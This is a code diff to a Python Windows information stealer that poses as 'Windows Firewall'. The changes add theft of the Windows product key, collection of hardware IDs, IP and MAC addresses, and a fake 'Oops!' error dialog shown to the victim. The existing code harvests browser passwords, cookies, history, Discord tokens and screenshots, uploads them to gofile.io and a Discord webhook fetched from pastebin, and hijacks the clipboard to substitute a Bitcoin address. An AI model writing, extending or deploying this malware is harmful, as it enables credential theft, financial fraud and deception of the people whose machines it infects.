@@ -9,12 +9,16 @@ from urllib.request import Request, urlopen
 from winregistry import WinRegistry as Reg
 from subprocess import Popen, PIPE
 import win32api
+import traceback
 import win32con
 import random
 from PIL import ImageGrab
+from cpuinfo import get_cpu_info
 import ctypes
 import sys
+import windows_tools.product_key
 import getpass
+import psutil
 import re
 import requests
 import subprocess
@@ -31,7 +35,11 @@ from Crypto.Cipher import AES
 import shutil
 from datetime import datetime, timedelta
 from base64 import b64decode
-import platform
+from platform import system, release, version, machine, processor
+from socket import gethostname, gethostbyname
+from uuid import getnode
+import logging
+import wmi
 
 # Configuration
 debugger = False
@@ -39,6 +47,9 @@ BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v'
 pastebin = "https://pastebin.com/raw/fiFGQEcy"
 hiddenWindow = False
 FakeFileName = "Windows Firewall"
+fakeError = True 
+fakeErrorMessage = "An unexpected error has occured." 
+fakeErrorTitle = "Oops!"
 
 # Defining needed variables
 webhookURL = requests.get(pastebin).text
@@ -64,6 +75,8 @@ PATHS = {
     "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
     "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
 }
+computer = wmi.WMI()
+cpuInfo = get_cpu_info()
 
 class Clipboard:
     def __init__(self):
@@ -143,9 +156,10 @@ class Logger():
         history = cursor.fetchall()
         with open ('hist.txt','w') as f:
             for title, url in history:
-                f.write(f"Title: {str(title.encode('utf-8').decode('utf-8')).strip()}\nURL: {str(url.encode('utf-8').decode('utf-8')).strip()}" + "\n" + "-" * 50 + "\n")
+                f.write(f"Title: {str(title.encode('unicode-escape').decode('utf-8')).strip()}\nURL: {str(url.encode('unicode-escape').decode('utf-8')).strip()}" + "\n" + "-" * 50 + "\n")
             f.close()
         c.close()
+        win32api.SetFileAttributes("histdb.db", win32con.FILE_ATTRIBUTE_NORMAL)
         os.remove("histdb.db")
         win32api.SetFileAttributes("hist.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
     def passwordLog():
@@ -207,6 +221,65 @@ class Logger():
         except Exception as e:
             print(e)
     def uploadFiles():
+        # Get product key
+        try:
+            windowsKey = windows_tools.product_key.get_windows_product_key_from_reg()
+        except Exception as e:
+            print(e)
+            windowsKey = "N/A"
+        # Get basic pc data
+        def gethwid():
+            p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+            return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+        reg = Reg()
+        path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
+        hwid2 = str(reg.read_entry(path, 'HwProfileGuid')).split("'")[5]
+        try:
+            info={}
+            info['Platform']= system() + " " + release()
+            info['Platform Version']=version()
+            info['Architecture']=machine()
+            info['Hostname']=gethostname()
+            info['HWID 1'] = "{" + gethwid().rstrip() + "}"
+            info['HWID 2'] = hwid2
+            info['Private IP Address']=gethostbyname(gethostname())
+            info['Mac Address']=':'.join(re.findall('..', '%012x' % getnode()))
+            info['CPU']=cpuInfo['brand_raw']
+            info['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
+            info['GPU'] = computer.Win32_VideoController()[0].name
+            resultPC = json.dumps(info, indent=4)
+            with open("pci.txt", "a") as pciFile:
+                win32api.SetFileAttributes("pci.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
+                pciFile.write(resultPC)
+                pciFile.close()
+            try:
+                pcInfoRaw = requests.post('https://store7.gofile.io/uploadFile', files={'file': ('pci.txt', open('pci.txt', 'rb')),}).text
+                pcInfoUploaded = f"[Raw]({pcInfoRaw[87:113]})"
+            except:
+                pcInfoUploaded = "Raw: N/A"
+                pass
+        except Exception as e:
+            logging.exception(e)
+            resultPC = "N/A"
+        try:
+            info2={}
+            info2['Platform']= system() + " " + release()
+            info2['Platform Version']=version()
+            info2['Architecture']=machine()
+            info2['Hostname']=gethostname()
+            info2['HWID 1'] = "{" + gethwid().rstrip() + "}"
+            info2['HWID 2'] = hwid2
+            finalLenIP = len(str(gethostbyname(gethostname()))) - len(str(gethostbyname(gethostname()))[:5])
+            info2['Private IP Address']= str(gethostbyname(gethostname()))[:5] + "*" * finalLenIP
+            finalLenMac = len(str(':'.join(re.findall('..', '%012x' % getnode())))) - len(str(':'.join(re.findall('..', '%012x' % getnode())))[:5])
+            info2['Mac Address']=':'.join(re.findall('..', '%012x' % getnode())) + "*" * finalLenMac
+            info2['CPU']=cpuInfo['brand_raw']
+            info2['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
+            info2['GPU'] = computer.Win32_VideoController()[0].name
+            resultPC2 = json.dumps(info2, indent=4)
+        except Exception as e:
+            logging.exception(e)
+            resultPC2 = "N/A"
         # Get screenshot
         try:
             screen = ImageGrab.grab()
@@ -228,7 +301,7 @@ class Logger():
             os.remove("hist.txt")
         except Exception as e:
             print(e)
-            cookiesUploaded = "History: N/A"
+            historyUploaded = "History: N/A"
 
         # Cookies
         try:
@@ -287,9 +360,6 @@ class Logger():
             except:
                 url = url[:-4]
             return url
-        def gethwid():
-            p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-            return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
         def getfriends(token):
             try:
                 return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
@@ -357,11 +427,9 @@ class Logger():
                 nitro = bool(user_data.get("premium_type"))
                 billing = bool(has_payment_methods(token))
                 locationOfIP = "https://whatismyipaddress.com/ip/" + ip
-                reg = Reg()
-                path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
-                #hwid = str(reg.read_value(path, 'HwProfileGuid')).split("'")[7] not working
                 getColor = [0x1abc9c, 0x11806a, 0x2ecc71, 0x1f8b4c, 0x3498db, 0x206694, 0x9b59b6, 0x71368a, 0xe91e63, 0xad1457, 0xf1c40f, 0xc27c0e, 0xe67e22, 0xa84300, 0xe74c3c, 0x992d22, 0x95a5a6, 0x607d8b, 0x979c9f, 0x546e7a, 0x7289da, 0x99aab5]
                 randomColor = random.choice(getColor)
+                
                 embed = {
                     "color": randomColor,
                     "fields": [
@@ -382,7 +450,12 @@ class Logger():
                         },
                         {
                             "name": "**Logged Data**",
-                            "value":  f"{historyUploaded} | {cookiesUploaded} | {passwordsUploaded} | {screenshotUploaded}\n\nHwid:\n {gethwid()}",
+                            "value":  f"{historyUploaded} | {cookiesUploaded} | {passwordsUploaded} | {screenshotUploaded}\n\n",
+                            "inline": False
+                        },
+                        {
+                            "name": "**PC Data**",
+                            "value":  f"```{resultPC2}```{pcInfoUploaded}\n",
                             "inline": False
                         },
                     ],
@@ -408,6 +481,11 @@ class Logger():
             urlopen(Request(webhookURL, data=dumps(webhook).encode(), headers=getheaders()))
         except Exception as e:
             print(e)
+    def msg():
+        if fakeError == True:
+            ctypes.windll.user32.MessageBoxExW(0, fakeErrorMessage, fakeErrorTitle, 0x40000)
+        else:
+            pass
     def btcClip():
         m = Methods()
         while True:
@@ -443,6 +521,10 @@ class Logger():
         except:
             pass
         try:
+            Logger.msg()
+        except:
+            pass
+        try:
             Logger.btcClip()
         except:
             pass
@@ -454,33 +536,38 @@ class Logger():
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
         try:
             Logger.startup()
-        except Exception as e:
-            print(e)
+        except Exception:
+            print(traceback.format_exc())
             pass
         try:
             Logger.historyLog()
-        except Exception as e:
-            print(e)
+        except Exception:
+            print(traceback.format_exc())
             pass
         try:
             Logger.cookieLog()
-        except Exception as e:
-            print(e)
+        except Exception:
+            print(traceback.format_exc())
             pass
         try:
             Logger.passwordLog()
-        except Exception as e:
-            print(e)
+        except Exception:
+            print(traceback.format_exc())
             pass
         try:
             Logger.uploadFiles()
-        except Exception as e:
-            print(e)
+        except Exception:
+            print(traceback.format_exc())
+            pass
+        try:
+            Logger.msg()
+        except Exception:
+            print(traceback.format_exc())
             pass
         try:
             Logger.btcClip()
-        except Exception as e:
-            print(e)
+        except Exception:
+            print(traceback.format_exc())
             pass
 
 if __name__ == '__main__':
